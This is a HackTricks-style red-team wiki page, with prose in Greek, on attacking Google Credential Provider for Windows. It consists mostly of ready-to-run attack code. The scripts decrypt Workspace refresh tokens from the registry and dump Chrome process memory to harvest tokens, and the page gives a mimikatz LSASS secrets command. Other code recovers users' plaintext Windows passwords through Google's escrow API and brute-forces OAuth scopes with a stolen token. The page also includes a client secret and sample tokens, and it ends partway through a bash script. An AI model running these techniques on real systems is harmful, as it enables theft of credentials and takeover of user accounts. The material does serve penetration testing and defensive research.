# GWS - Workspace Sync Attacks (GCPW, GCDS, Directory Sync with AD & EntraID)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## GCPW - Google Credential Provider for Windows

Αυτό είναι το single sign-on που παρέχει το Google Workspaces ώστε οι χρήστες να μπορούν να συνδεθούν στους υπολογιστές Windows τους χρησιμοποιώντας **τα διαπιστευτήρια Workspace τους**. Επιπλέον, αυτό θα αποθηκεύσει tokens για την πρόσβαση στο Google Workspace σε ορισμένα μέρη του υπολογιστή.

{% hint style="success" %}
Note that [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) is capable to detect **GCPW**, get information about the configuration and **even tokens**.
{% endhint %}

### GCPW - MitM

Όταν ένας χρήστης έχει πρόσβαση σε έναν υπολογιστή Windows συγχρονισμένο με το Google Workspace μέσω GCPW, θα χρειαστεί να συμπληρώσει μια κοινή φόρμα σύνδεσης. Αυτή η φόρμα σύνδεσης θα επιστρέψει έναν κωδικό OAuth που ο υπολογιστής θα ανταλλάξει για το refresh token σε ένα αίτημα όπως: 

{% code overflow="wrap" %}
```http
POST /oauth2/v4/token HTTP/2
Host: www.googleapis.com
Content-Length: 311
Content-Type: application/x-www-form-urlencoded
[...headers...]

scope=https://www.google.com/accounts/OAuthLogin
&grant_type=authorization_code
&client_id=77185425430.apps.googleusercontent.com
&client_secret=OTJgUOQcT7lO7GsGZq2G4IlT
&code=4/0AVG7fiQ1NKncRzNrrGjY5S02wBWBJxV9kUNSKvB1EnJDCWyDmfZvelqKp0zx8jRGmR7LUw
&device_id=d5c82f70-71ff-48e8-94db-312e64c7354f
&device_type=chrome
```
{% endcode %}

New lines have been added to make it more readable.

{% hint style="info" %}
Ήταν δυνατόν να εκτελεστεί μια MitM εγκαθιστώντας το `Proxifier` στον υπολογιστή, αντικαθιστώντας το δυαδικό αρχείο `utilman.exe` με ένα `cmd.exe` και εκτελώντας τα **χρηστικά χαρακτηριστικά** στη σελίδα σύνδεσης των Windows, τα οποία θα εκτελέσουν ένα **CMD** από το οποίο μπορείτε να **εκκινήσετε και να ρυθμίσετε το Proxifier**.\
Μην ξεχάσετε να **μπλοκάρετε την κυκλοφορία QUICK UDP** στο `Proxifier` ώστε να υποβαθμιστεί σε επικοινωνία TCP και να μπορείτε να τη δείτε.

Επίσης, ρυθμίστε στις "Υπηρεσίες και άλλοι χρήστες" και τις δύο επιλογές και εγκαταστήστε το πιστοποιητικό Burp CA στα Windows.
{% endhint %}

Επιπλέον, προσθέτοντας τα κλειδιά `enable_verbose_logging = 1` και `log_file_path = C:\Public\gcpw.log` στο **`HKLM:\SOFTWARE\Google\GCPW`** είναι δυνατόν να αποθηκεύει κάποια αρχεία καταγραφής.

### GCPW - Δακτυλικό αποτύπωμα

Είναι δυνατόν να ελέγξετε αν το GCPW είναι εγκατεστημένο σε μια συσκευή ελέγχοντας αν υπάρχει η παρακάτω διαδικασία ή αν υπάρχουν τα παρακάτω κλειδιά μητρώου:
```powershell
# Check process gcpw_extension.exe
if (Get-Process -Name "gcpw_extension" -ErrorAction SilentlyContinue) {
Write-Output "The process gcpw_xtension.exe is running."
} else {
Write-Output "The process gcpw_xtension.exe is not running."
}

# Check if HKLM\SOFTWARE\Google\GCPW\Users exists
$gcpwHKLMPath = "HKLM:\SOFTWARE\Google\GCPW\Users"
if (Test-Path $gcpwHKLMPath) {
Write-Output "GCPW is installed: The key $gcpwHKLMPath exists."
} else {
Write-Output "GCPW is not installed: The key $gcpwHKLMPath does not exist."
}

# Check if HKCU\SOFTWARE\Google\Accounts exists
$gcpwHKCUPath = "HKCU:\SOFTWARE\Google\Accounts"
if (Test-Path $gcpwHKCUPath) {
Write-Output "Google Accounts are present: The key $gcpwHKCUPath exists."
} else {
Write-Output "No Google Accounts found: The key $gcpwHKCUPath does not exist."
}
```
Στο **`HKCU:\SOFTWARE\Google\Accounts`** είναι δυνατή η πρόσβαση στο email του χρήστη και στο κρυπτογραφημένο **refresh token** αν ο χρήστης έχει συνδεθεί πρόσφατα.

Στο **`HKLM:\SOFTWARE\Google\GCPW\Users`** είναι δυνατή η εύρεση των **domains** που επιτρέπεται να συνδεθούν στο κλειδί `domains_allowed` και σε υποκλειδιά είναι δυνατή η εύρεση πληροφοριών για τον χρήστη όπως email, εικόνα, όνομα χρήστη, διάρκεια ζωής token, χειριστής token...

{% hint style="info" %}
Ο χειριστής token είναι ένα token που ξεκινά με `eth.` και από το οποίο μπορεί να εξαχθεί κάποια πληροφορία με ένα αίτημα όπως:

{% code overflow="wrap" %}
```bash
curl -s 'https://www.googleapis.com/oauth2/v2/tokeninfo' \
-d 'token_handle=eth.ALh9Bwhhy_aDaRGhv4v81xRNXdt8BDrWYrM2DBv-aZwPdt7U54gp-m_3lEXsweSyUAuN3J-9KqzbDgHBfFzYqVink340uYtWAwxsXZgqFKrRGzmXZcJNVapkUpLVsYZ_F87B5P_iUzTG-sffD4_kkd0SEwZ0hSSgKVuLT-2eCY67qVKxfGvnfmg'
# Example response
{
"audience": "77185425430.apps.googleusercontent.com",
"scope": "https://www.google.com/accounts/OAuthLogin",
"expires_in": 12880152
}
```
{% endcode %}

Επίσης, είναι δυνατόν να βρείτε το token handle ενός access token με ένα αίτημα όπως:

{% code overflow="wrap" %}
```bash
curl -s 'https://www.googleapis.com/oauth2/v2/tokeninfo' \
-d 'access_token=<access token>'
# Example response
{
"issued_to": "77185425430.apps.googleusercontent.com",
"audience": "77185425430.apps.googleusercontent.com",
"scope": "https://www.google.com/accounts/OAuthLogin",
"expires_in": 1327,
"access_type": "offline",
"token_handle": "eth.ALh9Bwhhy_aDaRGhv4v81xRNXdt8BDrWYrM2DBv-aZwPdt7U54gp-m_3lEXsweSyUAuN3J-9KqzbDgHBfFzYqVink340uYtWAwxsXZgqFKrRGzmXZcJNVapkUpLVsYZ_F87B5P_iUzTG-sffD4_kkd0SEwZ0hSSgKVuLT-2eCY67qVKxfGvnfmg"
}
```
{% endcode %}

Αφού γνωρίζω, δεν είναι δυνατόν να αποκτηθεί ένα refresh token ή access token από το token handle.
{% endhint %}

Επιπλέον, το αρχείο **`C:\ProgramData\Google\Credential Provider\Policies\<sid>\PolicyFetchResponse`** είναι ένα json που περιέχει τις πληροφορίες διαφόρων **ρυθμίσεων** όπως `enableDmEnrollment`, `enableGcpAutoUpdate`, `enableMultiUserLogin` (αν αρκετοί χρήστες από το Workspace μπορούν να συνδεθούν στον υπολογιστή) και `validityPeriodDays` (αριθμός ημερών που ένας χρήστης δεν χρειάζεται να επαληθευτεί απευθείας με την Google).

### GCPW - Tokens Ανανεώσεως Μητρώου

Μέσα στο μητρώο **`HKCU:\SOFTWARE\Google\Accounts`** μπορεί να είναι δυνατόν να βρείτε κάποιους λογαριασμούς με το **`refresh_token`** κρυπτογραφημένο μέσα. Η μέθοδος **`ProtectedData.Unprotect`** μπορεί εύκολα να το αποκρυπτογραφήσει.

<details>

<summary>Απόκτηση <strong><code>HKCU:\SOFTWARE\Google\Accounts</code></strong> δεδομένων και αποκρυπτογράφηση refresh_tokens</summary>
```powershell
# Import required namespace for decryption
Add-Type -AssemblyName System.Security

# Base registry path
$baseKey = "HKCU:\SOFTWARE\Google\Accounts"

# Function to search and decrypt refresh_token values
function Get-RegistryKeysAndDecryptTokens {
param (
[string]$keyPath
)

# Get all values within the current key
$registryKey = Get-Item -Path $keyPath
$foundToken = $false

# Loop through properties to find refresh_token
foreach ($property in $registryKey.Property) {
if ($property -eq "refresh_token") {
$foundToken = $true
try {
# Get the raw bytes of the refresh_token from the registry
$encryptedTokenBytes = (Get-ItemProperty -Path $keyPath -Name $property).$property

# Decrypt the bytes using ProtectedData.Unprotect
$decryptedTokenBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedTokenBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
$decryptedToken = [System.Text.Encoding]::UTF8.GetString($decryptedTokenBytes)

Write-Output "Path: $keyPath"
Write-Output "Decrypted refresh_token: $decryptedToken"
Write-Output "-----------------------------"
}
catch {
Write-Output "Path: $keyPath"
Write-Output "Failed to decrypt refresh_token: $($_.Exception.Message)"
Write-Output "-----------------------------"
}
}
}

# Recursively process all subkeys
Get-ChildItem -Path $keyPath | ForEach-Object {
Get-RegistryKeysAndDecryptTokens -keyPath $_.PSPath
}
}

# Start the search from the base key
Get-RegistryKeysAndDecryptTokens -keyPath $baseKey
```
</details>

Παράδειγμα εξόδου:

{% code overflow="wrap" %}
```
Path: Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\SOFTWARE\Google\Accounts\100402336966965820570Decrypted refresh_token: 1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI
```
{% endcode %}

Όπως εξηγείται σε [**αυτό το βίντεο**](https://www.youtube.com/watch?v=FEQxHRRP\_5I), αν δεν βρείτε το token στο μητρώο, είναι δυνατόν να τροποποιήσετε την τιμή (ή να διαγράψετε) από **`HKLM:\SOFTWARE\Google\GCPW\Users\<sid>\th`** και την επόμενη φορά που ο χρήστης θα έχει πρόσβαση στον υπολογιστή, θα χρειαστεί να συνδεθεί ξανά και το **token θα αποθηκευτεί στο προηγούμενο μητρώο**.

### GCPW - Tokens ανανέωσης δίσκου

Το αρχείο **`%LocalAppData%\Google\Chrome\User Data\Local State`** αποθηκεύει το κλειδί για την αποκρυπτογράφηση των **`refresh_tokens`** που βρίσκονται μέσα στα **προφίλ Google Chrome** του χρήστη όπως:

* `%LocalAppData%\Google\Chrome\User Data\Default\Web Data`
* `%LocalAppData%\Google\Chrome\Profile*\Default\Web Data`

Είναι δυνατόν να βρείτε κάποιο **C# code** που έχει πρόσβαση σε αυτά τα tokens με αποκρυπτογραφημένο τρόπο στο [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe).

Επιπλέον, η κρυπτογράφηση μπορεί να βρεθεί σε αυτόν τον κώδικα: [https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216)

Μπορεί να παρατηρηθεί ότι χρησιμοποιείται το AESGCM, το κρυπτογραφημένο token ξεκινά με μια **έκδοση** (**`v10`** αυτή τη στιγμή), στη συνέχεια [**έχει 12B nonce**](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L42), και στη συνέχεια έχει το **cypher-text** με ένα τελικό **mac 16B**.

### GCPW - Dumping tokens από τη μνήμη διαδικασιών

Το παρακάτω script μπορεί να χρησιμοποιηθεί για να **dump** κάθε **Chrome** διαδικασία χρησιμοποιώντας το `procdump`, να εξάγει τις **αλφαβητικές ακολουθίες** και στη συνέχεια να **αναζητήσει** ακολουθίες σχετικές με **access και refresh tokens**. Αν το Chrome είναι συνδεδεμένο σε κάποια Google τοποθεσία, κάποια **διαδικασία θα αποθηκεύει refresh και/ή access tokens στη μνήμη!**

<details>

<summary>Dump Chrome processes and search tokens</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -accepteula -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}

Remove-Item -Path $dumpFolder -Recurse -Force
```
</details>

Δοκίμασα το ίδιο με το `gcpw_extension.exe` αλλά δεν βρήκε κανένα token.

Για κάποιο λόγο, **ορισμένα εξαγόμενα access tokens δεν θα είναι έγκυρα (αν και κάποια θα είναι)**. Δοκίμασα το παρακάτω σενάριο για να αφαιρέσω χαρακτήρες 1 προς 1 για να προσπαθήσω να αποκτήσω το έγκυρο token από την εξαγωγή. Ποτέ δεν με βοήθησε να βρω ένα έγκυρο, αλλά ίσως να βοηθήσει:

<details>

<summary>Έλεγχος access token αφαιρώντας χαρακτήρες 1 προς 1</summary>
```bash
#!/bin/bash

# Define the initial access token
access_token="ya29.a0AcM612wWX6Pe3Pc6ApZYknGs5n66W1Hr1CQvF_L_pIm3uZaXWisWFabzxheYCHErRn28l2UOJuAbMzfn1TUpSKqvYvlhXJpxQsKEtwhYXzN2BZdOQNji0EXfF7po1_0WaxhwqOiE0CFQciiL8uAmkRsoXhq9ekC_S8xLrODZ2yKdDR6gSFULWaiIG-bOCFx3DkbOdbjAk-U4aN1WbglUAJdLZh7DMzSucIIZwKWvBxqqajSAjrdW0mRNVN2IfkcVLPndwj7fQJV2bQaCgYKAbQSAQ4SFQHGX2MiPuU1D-9-YHVzaFlUo_RwXA0277"

# Define the URL for the request
url="https://www.googleapis.com/oauth2/v1/tokeninfo"

# Loop until the token is 20 characters or the response doesn't contain "error_description"
while [ ${#access_token} -gt 20 ]; do
# Make the request and capture the response
response=$(curl -s -H "Content-Type: application/x-www-form-urlencoded" -d "access_token=$access_token" $url)

# Check if the response contains "error_description"
if [[ ! "$response" =~ "error_description" ]]; then
echo "Success: Token is valid"
echo "Final token: $access_token"
echo "Response: $response"
exit 0
fi

# Remove the last character from the token
access_token=${access_token:0:-1}

echo "Token length: ${#access_token}"
done

echo "Error: Token invalid or too short"
```
</details>

### GCPW - Ανάκτηση του καθαρού κειμένου του κωδικού πρόσβασης

Για να εκμεταλλευτείτε το GCPW για να ανακτήσετε το καθαρό κείμενο του κωδικού πρόσβασης, είναι δυνατόν να εξαγάγετε τον κωδικό πρόσβασης που είναι κρυπτογραφημένος από το **LSASS** χρησιμοποιώντας το **mimikatz**:
```bash
mimikatz_trunk\x64\mimikatz.exe token::elevate lsadump::secrets exit
```
Στη συνέχεια, αναζητήστε το μυστικό όπως `Chrome-GCPW-<sid>` όπως στην εικόνα:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-6044191430395675441-x.jpg" alt=""><figcaption></figcaption></figure>

Στη συνέχεια, με ένα **access token** με το πεδίο `https://www.google.com/accounts/OAuthLogin` είναι δυνατό να ζητήσετε το ιδιωτικό κλειδί για να αποκρυπτογραφήσετε τον κωδικό πρόσβασης:

<details>

<summary>Script για να αποκτήσετε τον κωδικό πρόσβασης σε καθαρό κείμενο δεδομένου του access token, του κωδικού πρόσβασης που έχει κρυπτογραφηθεί και του resource id</summary>
```python
import requests
from base64 import b64decode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA

def get_decryption_key(access_token, resource_id):
try:
# Request to get the private key
response = requests.get(
f"https://devicepasswordescrowforwindows-pa.googleapis.com/v1/getprivatekey/{resource_id}",
headers={
"Authorization": f"Bearer {access_token}"
}
)

# Check if the response is successful
if response.status_code == 200:
private_key = response.json()["base64PrivateKey"]
# Properly format the RSA private key
private_key = f"-----BEGIN RSA PRIVATE KEY-----\n{private_key.strip()}\n-----END RSA PRIVATE KEY-----"
return private_key
else:
raise ValueError(f"Failed to retrieve private key: {response.text}")

except requests.RequestException as e:
print(f"Error occurred while requesting the private key: {e}")
return None

def decrypt_password(access_token, lsa_secret):
try:
# Obtain the private key using the resource_id
resource_id = lsa_secret["resource_id"]
encrypted_data = b64decode(lsa_secret["encrypted_password"])

private_key_pem = get_decryption_key(access_token, resource_id)
print("Found private key:")
print(private_key_pem)

if private_key_pem is None:
raise ValueError("Unable to retrieve the private key.")

# Load the RSA private key
rsa_key = RSA.import_key(private_key_pem)
key_size = int(rsa_key.size_in_bits() / 8)

# Decrypt the encrypted data
cipher_rsa = PKCS1_OAEP.new(rsa_key)
session_key = cipher_rsa.decrypt(encrypted_data[:key_size])

# Extract the session key and other data from decrypted payload
session_header = session_key[:32]
session_nonce = session_key[32:]
mac = encrypted_data[-16:]

# Decrypt the AES GCM data
aes_cipher = AES.new(session_header, AES.MODE_GCM, nonce=session_nonce)
decrypted_password = aes_cipher.decrypt_and_verify(encrypted_data[key_size:-16], mac)

print("Decrypted Password:", decrypted_password.decode("utf-8"))

except Exception as e:
print(f"Error occurred during decryption: {e}")

# CHANGE THIS INPUT DATA!
access_token = "<acces_token>"
lsa_secret = {
"encrypted_password": "<encrypted-password>",
"resource_id": "<resource-id>"
}

decrypt_password(access_token, lsa_secret)
```
</details>

Είναι δυνατόν να βρείτε τα βασικά στοιχεία αυτού στον πηγαίο κώδικα του Chromium:

* API domain: [https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code](https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code)
* API endpoint: [https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70](https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70)

### GCPW - Δημιουργία διαπιστευτηρίων πρόσβασης από διαπιστευτήρια ανανέωσης

Χρησιμοποιώντας το διαπιστευτήριο ανανέωσης, είναι δυνατόν να δημιουργηθούν διαπιστευτήρια πρόσβασης χρησιμοποιώντας το και το client ID και client secret που καθορίζονται στην παρακάτω εντολή:
```bash
curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCPW - Scopes

{% hint style="info" %}
Σημειώστε ότι ακόμη και αν έχετε ένα refresh token, δεν είναι δυνατόν να ζητήσετε οποιοδήποτε scope για το access token καθώς μπορείτε να ζητήσετε μόνο τα **scopes που υποστηρίζονται από την εφαρμογή όπου δημιουργείτε το access token**.

Επίσης, το refresh token δεν είναι έγκυρο σε κάθε εφαρμογή.
{% endhint %}

Από προεπιλογή, το GCPW δεν θα έχει πρόσβαση ως χρήστης σε κάθε πιθανό OAuth scope, οπότε χρησιμοποιώντας το παρακάτω σενάριο μπορούμε να βρούμε τα scopes που μπορούν να χρησιμοποιηθούν με το `refresh_token` για να δημιουργήσουμε ένα `access_token`:

<details>

<summary>Bash script to brute-force scopes</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

Και αυτό είναι το αποτέλεσμα που πήρα τη στιγμή που έγραφα:
```
Valid scopes:
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
```
Επιπλέον, ελέγχοντας τον πηγαίο κώδικα του Chromium είναι δυνατόν να [**βρείτε αυτό το αρχείο**](https://github.com/chromium/chromium/blob/5301790cd7ef97088d4862465822da4cb2d95591/google\_apis/gaia/gaia\_constants.cc#L24), το οποίο περιέχει **άλλες σφαίρες** που μπορεί να υποτεθεί ότι **δεν εμφανίζονται στη λίστα που έχει προηγουμένως υποστεί βίαιη δοκιμή**. Επομένως, αυτές οι επιπλέον σφαίρες μπορούν να υποτεθούν:

<details>

<summary>Επιπλέον σφαίρες</summary>
```
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/aidahttps://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome
```
</details>

Σημειώστε ότι το πιο ενδιαφέρον είναι πιθανώς:
```c
// OAuth2 scope for access to all Google APIs.
const char kAnyApiOAuth2Scope[] = "https://www.googleapis.com/auth/any-api";
```
Ωστόσο, προσπάθησα να χρησιμοποιήσω αυτό το πεδίο για να αποκτήσω πρόσβαση στο gmail ή να καταγράψω ομάδες και δεν λειτούργησε, οπότε δεν ξέρω πόσο χρήσιμο είναι ακόμα.

**Αποκτήστε ένα διακριτικό πρόσβασης με όλα αυτά τα πεδία**:

<details>

<summary>Bash script για τη δημιουργία διακριτικού πρόσβασης από refresh_token με όλα τα πεδία</summary>
```bash
export scope=$(echo "https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
